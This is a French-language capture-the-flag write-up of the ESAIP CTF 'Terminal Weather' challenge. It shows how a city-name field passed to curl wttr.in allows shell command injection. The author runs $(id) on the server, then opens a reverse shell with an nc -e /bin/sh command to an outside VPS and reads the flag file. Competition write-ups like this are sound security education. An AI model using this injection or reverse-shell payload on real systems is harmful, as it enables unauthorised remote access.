---
title: "[ESAIP CTF] - Terminal Weather (479)"
date: 2022-01-02
categories: ['pwn']
draft: false
---
---

---
### Author : `Rxphgui` 
---

Nous allons aujourd'hui voir le dernier challenge en pwn de l'ESAIP CTF.
Nous n'avions pas de binaire simplement un remote.

Lorsque nous nous connections nous avions cela :

```bash
[raphgui@ret2arch:Téléchargements/pwn][1]$ nc terminal-weather.esaip-cyber.com 55555               (06-05 17:00)
Welcome to the Terminal Weather Service

----- MENU -----
 1. Change city
 2. Get weather
 3. Exit

Choice:
```

## Introduction

Ce challenge est celui qui m'a prit le plus de temps (2 heures). Pourtant le principe est simple, on va y venir.
Nous avons donc un menu avec des options tels que :

```
- Change city
- Get weather
```

Nous pouvons donc enlever les éventuelles technique de heap traditionnelles (Uaf & Double Free).

Nous allons alors tester le changement de ville pour voir ce qu'il se passe : 

```bash
----- Change city -----
Enter the new city name: MILF
New city: MILF

----- MENU -----
 1. Change city
 2. Get weather
 3. Exit

Choice:
```
Nous allons tester d'avoir le temps de cette ville :

```bash
----- Weather -----
MILF: ⛅️ (Partly cloudy) +31°C 🌒 1012hPa


----- MENU -----
 1. Change city
 2. Get weather
 3. Exit

Choice:
```

## Exploitation 

On comprends donc qu'il faudrait passer comme nom de ville notre payload. Au bout de plusieurs essaie, je teste ça :

```bash
----- Change city -----
Enter the new city name: /bin/sh
New city: /bin/sh

----- MENU -----
 1. Change city
 2. Get weather
 3. Exit

Choice: 2

----- Weather -----
<a href="/bin/sh?format=%l:+%c(%C)+%t+%m+%P\n">Moved Permanently</a>.
```

Nous avons réussi à avoir une erreur. C'est à ce moment là que j'ai perdu énormement de temps.
Je pensais pouvoir refermer la balise et ensuite injecter une commande.
Et j'ai passé plus d'une heure sur ça.

Ensuite j'arrive à avoir une erreur qui me donne un compte Twitter :

```bash
Follow @igor_chubin for wttr.in updates
```

En checkant son twitter, il s'agit du créateur de l'API pour le temps. Pour intéragir avec son API, nous devons faire un :

```
curl wttr.in/<la ville>
```

On comprend donc à ce moment là que c'est le cas avec notre programme.

## GET A SHELL

J'ai essayé les commandes injections telles que  :

```
ls; | ls# ...
```

Certain caractère étaient filtrés.

Puis j'ai trouvé cela :

```bash
----- Change city -----
Enter the new city name: $(id)
New city: $(id)

----- MENU -----
 1. Change city
 2. Get weather
 3. Exit

Choice: 2

----- Weather -----
>>>    _  _    ___  _  _        
>>>   | || |  / _ \| || |         
>>>   | || |_| | | | || |_         
>>>   |__   _| |_| |__   _|         
>>>      |_|  \___/   |_|       
>>>                          
>>>   404 UNKNOWN LOCATION: uid=1000(challenge)   
>>>                    
----
```

Nous avons donc réussi à injecter une comande qui a été exécuté par le serveur. 
J'ai donc fais un `ls` pour voir ce qu'on avait :

```bash
entrypoint.sh
```

Lancer des commandes par le nom de la ville, est assez long. Il nous faut un shell.

## GET A SHELL

Pour cette dernière partie, nous allons donc tenter d'obtenir un reverse shell.

```bash
----- Change city -----
Enter the new city name: $(nc 141.95.159.112 1337 -e /bin/sh)
New city: $(nc 141.X.X.X 1337 -e /bin/sh)
```

Nous avons alors une connection sur le VPS :

```
rxph@vps-d9a65da8:~$ nc -lnvp 1337
Listening on 0.0.0.0 1337
Connection received on 20.74.23.147 2048 
id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
ls -lah
total 20K    
drwxr-x---    1 root     challeng    4.0K Jun  3 17:18 .
drwxr-xr-x    1 root     root        4.0K Jun  5 10:48 ..
-rwxr-x---    1 root     challeng      31 Jun  3 17:15 .flag.txt
-rw-r-x---    1 root     challeng     117 Jun  3 17:18 entrypoint.sh
-rwxr-x---    1 root     challeng    1.2K Jun  3 17:15 weather.py
cat .flag.txt
ECTF{N0_W347h3r_f0r_b4d_b0yyy5}
```

Ce challenge était super cool, j'ai pu passé une bonne partie de ce challenge à chercher avec [hashp4](https://milfctf.com/about/#hashp4).

